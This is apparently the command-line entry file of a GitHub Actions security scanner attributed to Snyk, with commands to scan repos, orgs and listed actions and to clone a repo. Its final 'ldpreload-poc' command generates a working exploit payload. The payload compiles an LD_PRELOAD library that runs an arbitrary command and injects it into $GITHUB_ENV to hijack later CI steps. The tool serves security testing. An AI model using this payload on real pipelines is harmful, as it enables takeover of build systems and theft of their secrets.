import dotenv from 'dotenv';
import { program, Option, InvalidArgumentError } from 'commander';
import { resolve } from 'node:path';
import { readFileSync } from 'fs';
import YAML from 'yaml';

import { OutputHandler } from './lib/outputHandler.mjs';
import { logger, GITHUB_URL_RE } from './lib/utils.mjs';
import { Cloner } from './lib/clone.mjs';
import { Scanner } from './lib/scanner.mjs';
import { Action, Repo, Org } from './lib/actions.mjs';

function validateUrl(url) {
  if (!url.match(GITHUB_URL_RE)) {
    throw new InvalidArgumentError("Invalid Github URL")
  }
  return url;
}

async function setup(_options) {
  const options = { ..._options.opts(), ..._options.parent.opts() };
  dotenv.config({ path: resolve(options.env) })
  const outputHandler = new OutputHandler(options);
  const scanner = await Scanner.new(options);

  return {
    options,
    outputHandler,
    scanner
  }
}

async function main() {
  logger.info("github-actions-scanner by Snyk (2024)");
  program
    .description('Github Actions Scanner')
    .option('-e, --env <path>', '.env file path.', '.env')
    .option('-r, --recurse', 'Recurse into referenced actions')
    .addOption(new Option('-m, --max-depth <depth>', 'Max Recursion Depth').default(5).argParser(parseInt).implies({ recurse: true }))
    .addOption(new Option('-s, --scan-rules <rule1,rule2,...>', 'Comma separated list of rules to use, by ID. Negate by prefixing with !').default('').argParser(arg => arg.split(",")))

    .option('--output <path>', 'Output file path.')
    .addOption(new Option('-f, --format <format>', 'Output format').choices(["json", "text"]).default("text"))

  program.command("list-rules")
    .description("List all available rules")
    .action(async ({ }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      for (const rule of scanner.rules) {
        console.log(rule.id);
      }
    })

  program.command("scan-repo")
    .description("Scan a single repo")
    .requiredOption('-u, --url <string>', 'Github repository URL.', validateUrl)
    .action(async ({ url }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      const repo = await Repo.fromUrl(url);
      let findings = await repo.scan(options, scanner);
      logger.info(`Scanned ${scanner.scanned} actions`);
      outputHandler.reportFindings(findings);
    })

  program.command("scan-org")
    .description("Scan all repos in an org")
    .requiredOption('-o, --org <name>', 'Github org name.')
    .action(async ({ org: orgname }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      let org = new Org(orgname);
      let findings = await org.scan(options, scanner);
      logger.info(`Scanned ${scanner.scanned} actions`);
      outputHandler.reportFindings(findings);
    })

  program.command("scan-actions")
    .description("Scan a list of standalone actions from a file")
    .option('-a, --actions-yaml [actions-yaml-path]', 'Analyze actions from yaml.', "./github-action-repos.yml")
    .action(async ({ actionsYaml: actionsYamlFile }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      let actionsYaml;
      try {
        let actionsContent = await readFileSync(resolve(actionsYamlFile), { encoding: 'utf8' });
        actionsYaml = YAML.parse(actionsContent);
      } catch (e) {
        logger.error(`Error parsing ${actionsYamlFile}: ${e.message}`)
        return
      }
      let actions = [];
      for (const url of actionsYaml?.repos) {
        const repo = await Action.fromUrl(url);
        if (repo) actions.push(repo)
      }

      let findings = [];
      for (const action of actions) {
        findings.push(...await action.scan(options, scanner));
      }
      logger.info(`Scanned ${scanner.scanned} actions`);
      outputHandler.reportFindings(findings);
    })

  program.command("clone")
    .description("Pseudo-fork a repo for testing")
    .requiredOption('-u, --url <string>', 'Github repository URL.')
    .action(async ({ url }, _options) => {
      await setup(_options);
      const clone = new Cloner(url);
      return clone.run();
    })

  program.command("ldpreload-poc")
    .description("Create a PoC to exploit subsequent steps after command injection with LD_PRELOAD")
    .requiredOption("-c, --command <command>", "Command to run from the LD_PRELOAD")
    .addOption(new Option("-b, --base64", "Encode the code for injection"))
    .action(({ command, base64 }, _options) => {
      const ldcode = Buffer.from(`#include <stdlib.h>
void __attribute__((constructor)) so_main() { unsetenv("LD_PRELOAD"); system("${command.replace("\"", "\\\"")}"); }
`)
      const code = Buffer.from(`echo ${ldcode.toString("base64")} | base64 -d | cc -fPIC -shared -xc - -o $GITHUB_WORKSPACE/ldpreload-poc.so; echo "LD_PRELOAD=$GITHUB_WORKSPACE/ldpreload-poc.so" >> $GITHUB_ENV`)
      console.log()
      console.log(code.toString(base64 ? "base64" : "ascii"));
    });

  program.parse();

}

await main();
